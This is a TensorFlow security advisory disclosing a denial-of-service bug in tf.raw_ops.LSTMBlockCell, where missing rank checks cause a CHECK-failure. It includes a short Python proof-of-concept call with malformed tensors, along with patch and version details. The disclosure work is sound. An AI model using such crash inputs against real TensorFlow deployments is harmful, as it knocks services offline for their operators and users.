summary: "Missing validation causes denial of service via `LSTMBlockCell`\n### Impact\nThe implementation\
  \ of [`tf.raw_ops.LSTMBlockCell`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/rnn/lstm_ops.cc)\
  \ does not fully validate the input arguments. This results in a `CHECK`-failure which can\
  \ be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\n\
  tf.raw_ops.LSTMBlockCell( \n  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),\n\
  \  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),\n  h_prev=tf.constant(0.592631638,\
  \ shape=[28,17], dtype=tf.float32),\n  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),\n\
  \  wci=tf.constant(0, shape=[], dtype=tf.float32),\n  wcf=tf.constant(0, shape=[17], dtype=tf.float32),\n\
  \  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),\n  b=tf.constant(0.75259006,\
  \ shape=[68], dtype=tf.float32),\n  forget_bias=1, cell_clip=0, use_peephole=False)\n``` \n\
  \  \nThe code does not validate the ranks of any of the arguments to this API call. This results\
  \ in `CHECK`-failures when the elements of the tensor are accessed.\n    \n### Patches\nWe\
  \ have patched the issue in GitHub commit [803404044ae7a1efac48ba82d74111fce1ddb09a](https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a).\n\
  \    \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on\
  \ TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and\
  \ still in supported range.\n\n### For more information                \nPlease consult [our\
  \ security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more\
  \ information regarding the security model and how to contact us with issues and questions.\n\
  \    \n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure\
  \ Systems Lab at Brown University."
